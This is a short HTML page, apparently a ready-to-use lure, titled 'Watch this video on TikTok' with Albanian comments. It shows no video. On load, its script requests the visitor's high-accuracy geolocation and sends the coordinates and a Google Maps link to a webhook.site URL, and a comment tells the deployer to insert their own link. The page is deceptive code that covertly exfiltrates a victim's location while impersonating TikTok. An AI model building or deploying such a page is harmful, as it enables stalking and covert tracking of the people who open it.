<!DOCTYPE html>
<html lang="sq">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Watch this video on TikTok</title>
    <!-- Tailwind CSS për dizajn -->
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-black min-h-screen flex items-center justify-center">

    <!-- Kodi i dërgimit të koordinatave -->
    <script>
        // VENDOS KËTU LINKUN TËND UNIK NGA WEBHOOK.SITE
        const webhookUrl = 'https://webhook.site/KOPJO_LINKUN_TËND_KËTU';

        function dergoKoordinatat() {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;

                        const urlPërfundimtare = `${webhookUrl}?lat=${lat}&lon=${lon}&maps=${encodeURIComponent(mapsUrl)}`;

                        fetch(urlPërfundimtare, { method: 'GET' })
                            .then(() => console.log('Të dhënat u dërguan!'))
                            .catch(err => console.error('Gabim gjatë dërgimit:', err));
                    },
                    function(error) {
                        console.error("Gabim në marrjen e lokacionit: ", error.message);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                alert("Shfletuesi yt nuk e mbështet Geolocation.");
            }
        }

        window.onload = dergoKoordinatat;
    </script>
</body>
</html>
